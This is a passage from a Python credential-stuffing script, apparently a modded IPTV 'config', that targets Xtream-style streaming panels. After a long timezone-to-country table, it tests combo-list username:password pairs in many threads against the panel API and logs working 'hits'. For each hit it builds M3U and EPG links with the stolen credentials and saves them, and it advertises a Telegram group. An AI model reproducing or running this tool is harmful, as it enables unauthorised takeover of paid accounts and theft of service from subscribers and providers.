	timezone=timezone.replace('Europe/Vaduz', 'Europe Vaduz Liechtenstein 🇱🇮')
	timezone=timezone.replace('Asia/Colombo', 'Asia Colombo Sri Lanka 🇱🇰')
	timezone=timezone.replace('Africa/Monrovia', 'Africa Monrovia Liberia 🇱🇷')
	timezone=timezone.replace('Africa/Maseru', 'Africa Maseru Lesotho 🇱🇸')
	timezone=timezone.replace('Europe/Vilnius', 'Europe Vilnius Lithuania 🇱🇹')
	timezone=timezone.replace('Europe/Luxembourg', 'Europe Luxembourg 🇱🇺')
	timezone=timezone.replace('Europe/Riga', 'Europe Riga Latvia 🇱🇻')
	timezone=timezone.replace('Africa/Tripoli', 'Africa Tripoli Libya 🇱🇾')
	timezone=timezone.replace('Africa/Casablanca', 'Africa Casablanca Morocco 🇲🇦')
	timezone=timezone.replace('Europe/Monaco', 'Europe Monaco 🇲🇨')
	timezone=timezone.replace('Europe/Chisinau', 'Europe Chisinau Moldova 🇲🇩')
	timezone=timezone.replace('Europe/Podgorica', 'Europe Podgorica Montenegro 🇲🇪')
	timezone=timezone.replace('America/Marigot', 'America Marigot Saint Martin 🇲🇫')
	timezone=timezone.replace('Indian/Antananarivo', 'Indian Antananarivo Madagascar 🇲🇬')
	timezone=timezone.replace('Pacific/Majuro', 'Pacific Majuro Marshall Islands 🇲🇭')
	timezone=timezone.replace('Pacific/Kwajalein', 'Pacific Kwajalein Marshall Islands 🇲🇭')
	timezone=timezone.replace('Europe/Skopje', 'Europe Skopje North Macedonia 🇲🇰')
	timezone=timezone.replace('Africa/Bamako', 'Africa Bamako Mali 🇲🇱')
	timezone=timezone.replace('Asia/Rangoon', 'Asia Rangoon Myanmar 🇲🇲')
	timezone=timezone.replace('Asia/Ulaanbaatar', 'Asia Ulaanbaatar Mongolia 🇲🇳')
	timezone=timezone.replace('Asia/Hovd', 'Asia Hovd Mongolia 🇲🇳')
	timezone=timezone.replace('Asia/Choibalsan', 'Asia Choibalsan Mongolia 🇲🇳')
	timezone=timezone.replace('Asia/Macau', 'Asia Macau 🇲🇴')
	timezone=timezone.replace('Pacific/Saipan', 'Pacific Saipan Northern Mariana Islands 🇲🇵')
	timezone=timezone.replace('America/Martinique', 'America Martinique 🇲🇶')
	timezone=timezone.replace('Africa/Nouakchott', 'Africa Nouakchott Mauritania 🇲🇷')
	timezone=timezone.replace('America/Montserrat', 'America Montserrat 🇲🇸')
	timezone=timezone.replace('Europe/Malta', 'Europe Malta 🇲🇹')
	timezone=timezone.replace('Indian/Mauritius', 'Indian Mauritius 🇲🇺')
	timezone=timezone.replace('Indian/Maldives', 'Indian Maldives 🇲🇻')
	timezone=timezone.replace('Africa/Blantyre', 'Africa Blantyre Malawi 🇲🇼')
	timezone=timezone.replace('America/Mexico_City', 'America Mexico City Mexico 🇲🇽')
	timezone=timezone.replace('America/Cancun', 'America Cancun Mexico 🇲🇽')
	timezone=timezone.replace('America/Merida', 'America Merida Mexico 🇲🇽')
	timezone=timezone.replace('America/Monterrey', 'America Monterrey Mexico 🇲🇽')
	timezone=timezone.replace('America/Matamoros', 'America Matamoros Mexico 🇲🇽')
	timezone=timezone.replace('America/Mazatlan', 'America Mazatlan Mexico 🇲🇽')
	timezone=timezone.replace('America/Chihuahua', 'America Chihuahua Mexico 🇲🇽')
	timezone=timezone.replace('America/Ojinaga', 'America Ojinaga Mexico 🇲🇽')
	timezone=timezone.replace('America/Hermosillo', 'America Hermosillo Mexico 🇲🇽')
	timezone=timezone.replace('America/Tijuana', 'America Tijuana Mexico 🇲🇽')
	timezone=timezone.replace('America/Santa_Isabel', 'America Santa Isabel Mexico 🇲🇽')
	timezone=timezone.replace('America/Bahia_Banderas', 'America Bahia Banderas Mexico 🇲🇽')
	timezone=timezone.replace('Asia/Kuala_Lumpur', 'Asia Kuala Lumpur Malaysia 🇲🇾')
	timezone=timezone.replace('Asia/Kuching', 'Asia Kuching Malaysia 🇲🇾')
	timezone=timezone.replace('Africa/Maputo', 'Africa Maputo Mozambique 🇲🇿')
	timezone=timezone.replace('Africa/Windhoek', 'Africa Windhoek Namibia 🇳🇦')
	timezone=timezone.replace('Pacific/Noumea', 'Pacific Noumea New Caledonia 🇳🇨')
	timezone=timezone.replace('Africa/Niamey', 'Africa Niamey Niger 🇳🇪')
	timezone=timezone.replace('Pacific/Norfolk', 'Pacific Norfolk Island 🇳🇫')
	timezone=timezone.replace('Africa/Lagos', 'Africa Lagos Nigeria 🇳🇬')
	timezone=timezone.replace('America/Managua', 'America Managua Nicaragua 🇳🇮')
	timezone=timezone.replace('Europe/Amsterdam', 'Europe Amsterdam Netherlands 🇳🇱')
	timezone=timezone.replace('Europe/Oslo', 'Europe Oslo Norway 🇳🇴')
	timezone=timezone.replace('Asia/Kathmandu', 'Asia Kathmandu Nepal 🇳🇵')
	timezone=timezone.replace('Pacific/Nauru', 'Pacific Nauru 🇳🇷')
	timezone=timezone.replace('Pacific/Niue', 'Pacific Niue 🇳🇺')
	timezone=timezone.replace('Pacific/Auckland', 'Pacific Auckland New Zealand 🇳🇿')
	timezone=timezone.replace('Pacific/Chatham', 'Pacific Chatham New Zealand 🇳🇿')
	timezone=timezone.replace('Asia/Muscat', 'Asia Muscat Oman 🇴🇲')
	timezone=timezone.replace('America/Panama', 'America Panama 🇵🇦')
	timezone=timezone.replace('America/Lima', 'America Lima 🇵🇪 Peru')
	timezone=timezone.replace('Pacific/Tahiti', 'Pacific Tahiti French Polynesia 🇵🇫 ')
	timezone=timezone.replace('Pacific/Marquesas', 'Pacific Marquesas French Polynesia 🇵🇫 ')
	timezone=timezone.replace('Pacific/Gambier', 'Pacific Gambier French Polynesia 🇵🇫 ')
	timezone=timezone.replace('Pacific/Port_Moresby', 'Pacific Port_Moresby Papua New Guinea 🇵🇬')
	timezone=timezone.replace('Asia/Manila', 'Asia Manila Philippines 🇵🇭')
	timezone=timezone.replace('Asia/Karachi', 'Asia Karachi Pakistan 🇵🇰')
	timezone=timezone.replace('Europe/Warsaw', 'Europe Warsaw Poland 🇵🇱')
	timezone=timezone.replace('America/Miquelon', 'America Saint Pierre and Miquelon 🇵🇲')
	timezone=timezone.replace('Pacific/Pitcairn', 'Pacific Pitcairn Islands 🇵🇳')
	timezone=timezone.replace('America/Puerto_Rico', 'America Puerto Rico 🇵🇷')
	timezone=timezone.replace('Asia/Gaza', 'Asia Gaza Palastinian Territories 🇵??')
	timezone=timezone.replace('Asia/Hebron', 'Asia Hebron Palastinian Territories 🇵🇸')
	timezone=timezone.replace('Europe/Lisbon', 'Europe Lisbon Portugal 🇵🇹')
	timezone=timezone.replace('Atlantic/Madeira', 'Atlantic Madeira Portugal 🇵🇹')
	timezone=timezone.replace('Atlantic/Azores', 'Atlantic Azores Portugal 🇵🇹')
	timezone=timezone.replace('Pacific/Palau', 'Pacific Palau 🇵🇼')
	timezone=timezone.replace('America/Asuncion', 'America Asuncion Paraguay 🇵🇾')
	timezone=timezone.replace('Asia/Qatar', 'Asia Qatar 🇶🇦')
	timezone=timezone.replace('Indian/Reunion', 'Indian Réunion 🇷🇪')
	timezone=timezone.replace('Europe/Bucharest', 'Europe Bucharest Romania 🇷🇴')
	timezone=timezone.replace('Europe/Belgrade', 'Europe Belgrade Serbia 🇷🇸')
	timezone=timezone.replace('Europe/Kaliningrad', 'Europe Kaliningrad Russia 🇷🇺')
	timezone=timezone.replace('Europe/Moscow', 'Europe Moscow Russia 🇷🇺')
	timezone=timezone.replace('Europe/Volgograd', 'Europe Volgograd Russia 🇷🇺')
	timezone=timezone.replace('Europe/Samara', 'Europe Samara Russia 🇷🇺')
	timezone=timezone.replace('Asia/Yekaterinburg', 'Asia Yekaterinburg Russia 🇷🇺')
	timezone=timezone.replace('Asia/Omsk', 'Asia Omsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Novosibirsk', 'Asia Novosibirsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Novokuznetsk', 'Asia Novokuznetsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Krasnoyarsk', 'Asia Krasnoyarsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Irkutsk', 'Asia Irkutsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Yakutsk', 'Asia Yakutsk Russia 🇷🇺')
	timezone=timezone.replace('Asia/Vladivostok', 'Asia Vladivostok Russia 🇷🇺')
	timezone=timezone.replace('Asia/Sakhalin', 'Asia Sakhalin Russia 🇷🇺')
	timezone=timezone.replace('Asia/Magadan', 'Asia Magadan Russia 🇷🇺')
	timezone=timezone.replace('Asia/Kamchatka', 'Asia Kamchatka Russia 🇷🇺')
	timezone=timezone.replace('Asia/Anadyr', 'Asia Anadyr Russia 🇷🇺')
	timezone=timezone.replace('Africa/Kigali', 'Africa Kigali Rwanda 🇷🇼')
	timezone=timezone.replace('Asia/Riyadh', 'Asia Riyadh Saudi Arabia 🇸🇦')
	timezone=timezone.replace('Pacific/Guadalcanal', 'Pacific Guadalcanal Solomon Islands 🇸🇧')
	timezone=timezone.replace('Indian/Mahe', 'Indian Mahe Seychelles 🇸🇨')
	timezone=timezone.replace('Africa/Khartoum', 'Africa Khartoum Sudan 🇸🇩')
	timezone=timezone.replace('Europe/Stockholm', 'Europe Stockholm Sweden 🇸🇪')
	timezone=timezone.replace('Asia/Singapore', 'Asia Singapore 🇸🇬')
	timezone=timezone.replace('Atlantic/St_Helena', 'Atlantic Saint Helena 🇸🇭')
	timezone=timezone.replace('Europe/Ljubljana', 'Europe Ljubljana Slovenia 🇸🇮')
	timezone=timezone.replace('Arctic/Longyearbyen', 'Arctic Longyearbyen Svalbard and Jan Mayen 🇸🇯')
	timezone=timezone.replace('Europe/Bratislava', 'Europe Bratislava Slovakia 🇸🇰')
	timezone=timezone.replace('Africa/Freetown', 'Africa Freetown Sierra Leone 🇸🇱')
	timezone=timezone.replace('Europe/San_Marino', 'Europe San Marino 🇸🇲')
	timezone=timezone.replace('Africa/Dakar', 'Africa Dakar Senegal 🇸🇳')
	timezone=timezone.replace('Africa/Mogadishu', 'Africa Mogadishu Somalia 🇸🇴')
	timezone=timezone.replace('America/Paramaribo', 'America Paramaribo Suriname 🇸🇷')
	timezone=timezone.replace('Africa/Juba', 'Africa Juba South Sudan 🇸🇸')
	timezone=timezone.replace('Africa/Sao_Tome', 'Africa São Tomé and Príncipe 🇸🇹')
	timezone=timezone.replace('America/El_Salvador', 'America El Salvador 🇸🇻')
	timezone=timezone.replace('America/Lower_Princes', 'America Lower Princes Sint Maarten 🇸🇽')
	timezone=timezone.replace('Asia/Damascus', 'Asia Damascus Syria 🇸🇾')
	timezone=timezone.replace('Africa/Mbabane', 'Africa Mbabane Swaziland 🇸🇿')
	timezone=timezone.replace('America/Grand_Turk', 'America Grand Turk Turks and Caicos Islands 🇹🇨')
	timezone=timezone.replace('Africa/Ndjamena', 'Africa Ndjamena Chad 🇹🇩')
	timezone=timezone.replace('Indian/Kerguelen', 'Indian Kerguelen French Southern Territories 🇹🇫')
	timezone=timezone.replace('Africa/Lome', 'Africa Lome Togo 🇹🇬')
	timezone=timezone.replace('Asia/Bangkok', 'Asia Bangkok Thailand 🇹🇭')
	timezone=timezone.replace('Asia/Dushanbe', 'Asia Dushanbe Tajikistan 🇹🇯')
	timezone=timezone.replace('Pacific/Fakaofo', 'Pacific Fakaofo Tokelau 🇹🇰')
	timezone=timezone.replace('Asia/Dili', 'Asia Dili Timor-Leste 🇹🇱')
	timezone=timezone.replace('Asia/Ashgabat', 'Asia Ashgabat Turkmenistan 🇹🇲')
	timezone=timezone.replace('Africa/Tunis', 'Africa Tunis Tunisia 🇹🇳')
	timezone=timezone.replace('Pacific/Tongatapu', 'Pacific Tongatapu Tonga 🇹🇴')
	timezone=timezone.replace('Europe/Istanbul', 'Europe Istanbul Turkey 🇹🇷')
	timezone=timezone.replace('America/Port_of_Spain', 'America Port of Spain Trinidad and Tobago 🇹🇹')
	timezone=timezone.replace('Pacific/Funafuti', 'Pacific Funafuti Tuvalu 🇹🇻')
	timezone=timezone.replace('Asia/Taipei', 'Asia Taipei Taiwan 🇹🇼')
	timezone=timezone.replace('Africa/Dar_es_Salaam', 'Africa Dar es Salaam Tanzania 🇹🇿')
	timezone=timezone.replace('Europe/Kiev', 'Europe Kiev Ukraine 🇺🇦')
	timezone=timezone.replace('Europe/Uzhgorod', 'Europe Uzhgorod Ukraine 🇺🇦')
	timezone=timezone.replace('Europe/Zaporozhye', 'Europe Zaporozhye Ukraine 🇺🇦')
	timezone=timezone.replace('Europe/Simferopol', 'Europe Simferopol Ukraine 🇺🇦')
	timezone=timezone.replace('Africa/Kampala', 'Africa Kampala Uganda 🇺🇬')
	timezone=timezone.replace('Pacific/Johnston', 'Pacific Johnston USA 🇺🇸')
	timezone=timezone.replace('Pacific/Midway', 'Pacific Midway USA 🇺🇸')
	timezone=timezone.replace('Pacific/Wake', 'Pacific Wake USA 🇺🇸')
	timezone=timezone.replace('America/New_York', 'America New York USA 🇺🇸')
	timezone=timezone.replace('America/Detroit', 'America Detroit USA 🇺🇸')
	timezone=timezone.replace('America/Kentucky/Louisville', 'America Kentucky Louisville USA 🇺🇸')
	timezone=timezone.replace('America/Kentucky/Monticello', 'America Kentucky Monticello USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Indianapolis', 'America Indiana Indianapolis USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Vincennes', 'America Indiana Vincennes USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Winamac', 'America Indiana Winamac USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Marengo', 'America Indiana Marengo USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Petersburg', 'America Indiana Petersburg USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Vevay', 'America Indiana Vevay USA 🇺🇸')
	timezone=timezone.replace('America/Chicago', 'America Chicago USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Tell_City', 'America Indiana Tell City USA 🇺🇸')
	timezone=timezone.replace('America/Indiana/Knox', 'America Indiana/Knox USA 🇺🇸')
	timezone=timezone.replace('America/Menominee', 'America Menominee USA 🇺🇸')
	timezone=timezone.replace('America/North_Dakota/Center', 'America North Dakota Center USA 🇺🇸')
	timezone=timezone.replace('America/North_Dakota/New_Salem', 'America North Dakota New Salem USA 🇺🇸')
	timezone=timezone.replace('America/North_Dakota/Beulah', 'America North Dakota Beulah USA 🇺🇸')
	timezone=timezone.replace('America/Denver', 'America Denver USA 🇺🇸')
	timezone=timezone.replace('America/Boise', 'America Boise USA 🇺🇸')
	timezone=timezone.replace('America/Shiprock', 'America Shiprock USA 🇺🇸')
	timezone=timezone.replace('America/Phoenix', 'America Phoenix USA 🇺🇸')
	timezone=timezone.replace('America/Los_Angeles', 'America Los Angeles USA 🇺🇸')
	timezone=timezone.replace('America/Anchorage', 'America Anchorage USA 🇺🇸')
	timezone=timezone.replace('America/Juneau', 'America Juneau USA 🇺🇸')
	timezone=timezone.replace('America/Sitka', 'America Sitka USA 🇺🇸')
	timezone=timezone.replace('America/Yakutat', 'America Yakutat USA 🇺🇸')
	timezone=timezone.replace('America/Nome', 'America Nome USA 🇺🇸')
	timezone=timezone.replace('America/Adak', 'America Adak USA 🇺🇸')
	timezone=timezone.replace('America/Metlakatla', 'America Metlakatla USA 🇺🇸')
	timezone=timezone.replace('Pacific/Honolulu', 'Pacific Honolulu USA 🇺🇸')
	timezone=timezone.replace('America/Montevideo', 'America Montevideo Uruguay 🇺🇾')
	timezone=timezone.replace('Asia/Samarkand', 'Asia Samarkand Uzbekistan 🇺🇿 ')
	timezone=timezone.replace('Asia/Tashkent', 'Asia Tashkent Uzbekistan 🇺🇿 ')
	timezone=timezone.replace('Europe/Vatican', 'Europe Vatican City State 🇻🇦')
	timezone=timezone.replace('America/St_Vincent', 'America Saint Vincent and the Grenadines 🇻🇨')
	timezone=timezone.replace('America/Caracas', 'America Caracas Venezuela 🇻🇪')
	timezone=timezone.replace('America/Tortola', 'America Tortola British Virgin Islands 🇻🇬')
	timezone=timezone.replace('America/St_Thomas', 'America Saint Thomas US Virgin Islands 🇻🇮')
	timezone=timezone.replace('Asia/Ho_Chi_Minh', 'Asia Ho Chi Minh Vietnam 🇻🇳')
	timezone=timezone.replace('Pacific/Efate', 'Pacific Efate Vanuatu 🇻🇺')
	timezone=timezone.replace('Pacific/Wallis', 'Pacific Wallis and Futuna 🇼🇫')
	timezone=timezone.replace('Pacific/Apia', 'Pacific Apia Samoa 🇼🇸')
	timezone=timezone.replace('Asia/Aden', 'Asia Aden Yemen 🇾🇪')
	timezone=timezone.replace('Indian/Mayotte', 'Indian Mayotte 🇾🇹')
	timezone=timezone.replace('Africa/Johannesburg', 'Africa Johannesburg South Africa 🇿🇦')
	timezone=timezone.replace('Africa/Lusaka', 'Africa Lusaka Zambia 🇿🇲')
	timezone=timezone.replace('Africa/Harare', 'Africa Harare Zimbabwe 🇿🇼')
	realm=veri.split('url":')[1].split(',')[0].replace('"',"")
	port=veri.split('port":')[1].split(',')[0].replace('"',"")
	user=veri.split('username":')[1].split(',')[0].replace('"',"")
	passw=veri.split('password":')[1].split(',')[0].replace('"',"")
	status=veri.split('status":')[1].split(',')[0].replace('"',"")
	message=veri.split('message":"')[1].split(',')[0].replace('"','')
	message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
	exp=veri.split('exp_date":')[1].split(',')[0].replace('"',"")
	if exp=="null":
		exp="🤴[[ UNLIMITED ]]🤴"
	else:
		exp=(datetime.datetime.fromtimestamp(int(exp)).strftime('%d %B %Y • %H:%M'))
	exp=exp
	if message=="":
		message="FAWX ✮ IPTV FOR FREE!"

	katelinkC="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
	try:
			res=ses.get(katelinkC,headers=HEADERd, verify=False)
			veri=""
	except:pass
	veri=str(res.text)
	kate1=""
	try:
			for i in veri.split('category_name":"'):
				kate1=kate1+" ⊰[👺]⊱ "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				kate1=kate1.replace(" ⊰[👺]⊱ [{ ⊰[👺]⊱", "")
				kate1=kate1.replace("⊰[👺]⊱ []", "NO LIVE")
	except:pass

	katelinkF="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_categories"
	try:
			res=ses.get(katelinkF,headers=HEADERd, verify=False)
			veri=""
	except:pass
	veri=str(res.text)
	kate2=""
	try:
			for i in veri.split('category_name":"'):
				kate2=kate2+" ⊰[🏴‍☠️]⊱ "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				kate2=kate2.replace(" ⊰[🏴‍☠️]⊱ [{ ⊰[🏴‍☠️]⊱", "")
				kate2=kate2.replace("⊰[🏴‍☠️]⊱ []", "NO VODS")
	except:pass

	katelinkS="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series_categories"
	try:
			res=ses.get(katelinkS,headers=HEADERd, verify=False)
			veri=""
	except:pass
	veri=str(res.text)
	kate3=""
	try:
			for i in veri.split('category_name":"'):
				kate3=kate3+" ⊰[🤴]⊱ "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace(r'\/','/')
				kate3=kate3.replace(" ⊰[🤴]⊱ [{ ⊰[🤴]⊱", "")
				kate3=kate3.replace("⊰[🤴]⊱ []", "NO SERIES")
	except:pass

	if status == 'Active':
		status = 'ACTIVE 💚'

	m3ulink = "http://"+realm+"/get.php?username="+user+"&password="+pas+"&type=m3u_plus"
	m3ulink2 = "http://"+panel+"/get.php?username="+user+"&password="+pas+"&type=m3u_plus&output=m3u8"
	EPGlink = "http://"+realm+"/xmltv.php?username="+user+"&password="+pas
	info = (f"""
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  XTREAM INFO  [[✮]] 
[[✮]] PORTAL⭆ http://{portal}
[[✮]] REAL⭆ http://{realm}
[[✮]] PORT⭆ {port}
[[✮]] EXPIRES⭆ {exp}
[[✮]] USERNAME⭆ {user}
[[✮]] PASSWORD⭆ {passw}
[[✮]] ACTIVE CONNECTIONS⭆ {acon}
[[✮]] MAXIMUM CONNECTIONS⭆ {mcon}
[[✮]] STATUS⭆ {status}
╚═[[  MODDED BY FAWX  ]]═╝
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  M3U LINKS INFO  [[✮]] 
[[✮]] PORTAL M3U⭆ {m3ulink2}
[[✮]] REAL M3U⭆ {m3ulink}
[[✮]] EPG LINK⭆ {EPGlink}
╚═[[  IPTV FOR FREE!!  ]]═╝
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  SERVER INFO  [[✮]] 
[[✮]] MESSAGE⭆ {message}
[[✮]] TIMEZONE⭆ {timezone}
╚═[[  ENJOY THE HITS  ]]═╝""")
	imzak1=""
	if kanall=="1":
		imzak1 = (f"""
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  ⟱ LIVE ⟱  [[✮]] 
⊰[👺]⊱{kate1} ⊰[👺]⊱ [[ #LIVE ]]
╚═[[  BEST IPTV SCAN  ]]═╝""")
	imzak2=""
	if kanall=="2":
		imzak2 = (f"""
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  ⟱ LIVE ⟱  [[✮]] 
⊰[👺]⊱{kate1} ⊰[👺]⊱ [[ #LIVE ]]
[[✮]]  ⟱ VOD ⟱  [[✮]] 
⊰[🏴‍☠️]⊱{kate2} ⊰[🏴‍☠️]⊱ [[ #VOD ]]
[[✮]]  ⟱ SERIES ⟱  [[✮]] 
⊰[🤴]⊱{kate3} ⊰[🤴]⊱ [[ #SERIES ]]
╚═[[  BEST IPTV SCAN  ]]═╝""")
	imzak3=""
	if kanall=="3":
		imzak3 = (f"""
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  ⟱ LIVE ⟱  [[✮]] 
⊰[👺]⊱ [[ HIDDEN ]] ⊰[👺]⊱ [[ #LIVE ]]
[[✮]]  ⟱ VOD ⟱  [[✮]] 
⊰[🏴‍☠️]⊱ [[ HIDDEN ]] ⊰[🏴‍☠️]⊱ [[ #VOD ]]
[[✮]]  ⟱ SERIES ⟱  [[✮]] 
⊰[🤴]⊱ [[ HIDDEN]] ⊰[🤴]⊱ [[ #SERIES ]]
╚═[[  BEST IPTV SCAN  ]]═╝""")
	xtra = (f"""
╔═══[[  👺𝙵𝙰𝚆𝚇🤴  ]]═══╗
[[✮]]  SCAN INFO  [[✮]] 
[[✮]] SCAN BY ☛[[ {nick} ]]☚
[[✮]] SCAN TIME⭆ """+str(time.strftime("%d %B %Y • %H:%M"))+"""
[[✮]] JOIN US⭆ t.me/+knGWqSfahTxkZTVk
╚═[[  MODDED BY FAWX  ]]═╝
""")
	yaz(info+imzak1+imzak2+imzak3+xtra+'\n')
	print(info+imzak1+imzak2+imzak3+xtra)
	hitz = hitz + 1
	if hitz >= hit:
		hitr = f'{AC}'

status_code=""
color=""
cpm = 0
hitr = f'{AC}'
def echox(user,pas,bot,combosay,oran,hit,status_code):
	global cpm,color
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
		cpm=cpm
	else:
		cpm=cpmx
	time_ = time.localtime()
	current_time = time.strftime('%H:%M:%S', time_)

	colors = [90, 91, 92, 93, 94, 95, 96, 97]
	color_code = colors[int(time.time()) % len(colors)]
	text ="🤴 𝙵𝙰𝚆𝚇 👺 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙱𝙴𝚂𝚃 𝙸𝙿𝚃𝚅 𝙶𝚁𝙾𝚄𝙿 🤴   "
	texx ="✮[[ 𝙿𝚈 𝙲𝙾𝙽𝙵𝙸𝙶 𝙼𝙾𝙳𝙳𝙴𝙳 𝙱𝚈 👺𝙵𝙰𝚆𝚇🤴 ]]✮   "
	echo = (f"""





       \x1b[0m\n    \x1b[1;91m  ✮[[ 𝙲𝙾𝙽𝙵𝙸𝙶 𝙼𝙾𝙳 𝙱𝚈 👺𝙵𝙰𝚆𝚇🤴 ]]✮   \x1b[0m\n\n
\33[3m\33[90m  ★      ★      ★      ★      ★      ★     {RST}
       
   \33[{color_code}m{texx}{RST}
          
   ╭─[[ 👺 𝙵𝙰𝚆𝚇 ✮ 𝙸𝙿𝚃𝚅 𝙵𝙾𝚁 𝙵𝚁𝙴𝙴! 🤴 ]]
   │➠ {C}START TIME➢ {A}{hora_ini} {RST}
   │➠ {VD}PANEL➢ {RST}{portal}{RST}
   │➠ {A}USER:PASS➢ {M}{user}:{pas}{RST}
   │➠ {VDC}BOT➢{bot} {RST}{CC} TOTAL➢ {combosay}/{combouz} {RST}{AZC} CPM➢ {cpm} {RST}
   │➠ {C}SCAN TIME➢ {A}{current_time} {A}{hitr}HITS➢ {hit} {RST} {VC}{oran}% {RST} 
   ╰─[[ 👺 𝙵𝙰𝚆𝚇 ✮ 𝙿𝚈 𝚂𝙲𝚁𝙸𝙿𝚃 𝙼𝙾𝙳! 🤴 ]]
   
   \33[{color_code}m{text}{RST}
   
\33[3m\33[90m  ★      ★      ★      ★      ★      ★     {RST}

  {A} Hello - {CC}{nick}   {RST}
  {A} You chose {V}{num_bots}{A} Bots  {RST}
  {A} Protocol:{VC}HTTP{A}|{color}{status_code}{A}|{RST}
  {A} Agent:{authorX}{authorc}  {RST}
  {A} Attack:{VC}{atackX}  {RST}
  {A} CloudFlare:{agentx}  {RST}
  {A} Server:{VC}ɴᴏ ꜱᴇʀᴠᴇʀ ɪᴘ{A}➺ {VC} ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ  {RST}
  {A} Combo:{VC}{combouz}{AC} in {CC}{dosyaaa} {RST}
  
\33[3m\33[90m  ★      ★      ★      ★      ★      ★     {RST}



""")
	print(echo)
	cpm=time.time()
	if status_code==200:color="\33[1m\33[32m"
	if status_code==301:color="\33[1m\33[1;31m"
	if status_code==302:color="\33[1m\33[1;31m"
	if status_code==403:color="\33[1m\33[1;31m"
	if status_code==404:color="\33[1m\33[38;5;202m"
	if status_code==407:color="\33[1m\33[38;5;003m"
	if status_code==429:color="\33[1m\33[1m\33[93m"
	if status_code==500:color="\33[1m\33[38;5;202m"
	if status_code==503:color="\33[1m\33[38;5;226m"
	if status_code==512:color="\33[1m\33[38;5;134m"
	if status_code==520:color="\33[1m\33[35m"

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti

bot=0
oran=""
def d1():
	global hit, hitr, bot
	bot=bot+1
	for paranormal in range(combouz):
		up=combogetir()
		if up:
			up = up.split(":")
			try:
				user=str(up[0].replace(" ",""))
			except:
				user=''
			try:
				pas=str(up[1].replace(" ",""))
				pas=str(pas.replace('\n',""))
			except:
				pas=''
			oran = 0
			oran = round((combosay / combouz) * 100, 2)

			link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			veri=""
			while True:
				try:
					res = ses.get(link,headers=HEADERd, timeout=3, verify=False)
					break
				except:
					time.sleep(1)
			echox(user,pas,bot,combosay,oran,hit,res.status_code)
			veri=str(res.text)
			if 'username' in veri:
			     status = veri.split('status":')[1]
			     status = status.split(',')[0]
			     status = status.replace('"', '')
			     if status == 'Active':
			     	hitr = f'{CC}'
			     	hit=hit+1
			     	onay(veri,user,pas)

import threading
for xd in range(int(num_bots)):
	XP = threading.Thread(target=d1)
	XP.start()